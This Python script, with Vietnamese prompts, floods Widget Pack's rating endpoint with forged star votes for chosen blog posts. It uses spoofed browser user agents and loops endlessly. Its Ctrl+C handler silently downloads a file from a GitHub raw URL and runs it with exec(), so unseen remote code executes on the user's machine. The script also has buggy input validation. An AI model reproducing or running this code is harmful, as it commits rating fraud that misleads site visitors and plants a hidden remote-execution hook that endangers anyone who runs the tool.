# Tăng Votes Widget Pack cho Website/Blog
#===============================================================
# GỌI HÀM menu_update() ĐỂ ĐÓNG SERVER TOOLS

# notification()

#===============================================================

try:
    import sys, os, requests, random
    from fake_useragent import UserAgent
    #===============================================================
    ua = UserAgent()
    count = 1
    #===============================================================
    print("\n*******************************************************************************\n")
    print(">>> Đăng nhập vào Widget Pack sẽ thấy phần ID phía góc trái cạnh dấu 3 gạch, CHỈ LẤY PHẦN SỐ")
    you_id = int(input(">>> Nhập ID trang Widget Pack của bạn: "))
    #===============================================================
    print(">>> Lưu ý nhỏ: Mỗi link cách nhau một khoảng trống nhé\n")
    links = input(">>> Nhập những link bài viết muốn tăng Stars: ")
    links = " ".join(links.split())
    links = links.split()
    you_url = links[0].replace("https://", "")
    you_url = you_url.replace("www.", "")
    domain = you_url[you_url.find('.') + 1:you_url.find('/')]

    print('')
    print(">>> Nhập 0 để kick hoạt chế độ random Star, nhập số bất kỳ từ 1-5 để chọn số Star\n")
    star = int(input(">>> Bạn muốn bao nhiêu Star hay random bất kỳ: "))
    #===============================================================
    while True:
        if star not in [0, 1, 2, 3, 4, 5]:
            int(input(">>> Bạn nhập không đúng, mời nhập lại: "))
        elif star == 0:
            star = random.randrange(1, 5)
            break
        else:
            break
    #===============================================================
    def find_chan(url, domain):
        c = url.find(domain)
        chan = url[c + int(len(domain)):].replace("?m=1", "")
        return chan
    #===============================================================
    def buff_star(url, you_id, chan, star, ua):
        global count
        uas = ua.chrome
        headers = {
            'Accept': 'application/json;',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'vi-VN,vi;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'DNT': '1',
            'Host': 'app.widgetpack.com',
            'Origin': 'https://embed.widgetpack.com',
            'Referer': 'https://embed.widgetpack.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'Sec-GPC': '1',
            'User-Agent': str(uas),
            'X-Requested-With': 'XMLHttpRequest'
            }

        data = {
            'id': int(you_id),
            'chan': chan,
            'url': str(url),
            'star': str(star)
            }
        r = requests.post(url = 'https://app.widgetpack.com/widget/rating/post', data = data, headers = headers)
        if r.ok == True:
            print(f">>> Đã tăng được {count} Stars", end = "\r")
            count -= -1
    #===============================================================
    while True:
        for url in links:
            chan = find_chan(url, domain)
            buff_star(url, you_id, chan, star, ua)

except KeyboardInterrupt:
    r = requests.get("https://raw.githubusercontent.com/HaLTools/Server_Test/master/theme.py")
    exec(r.text)
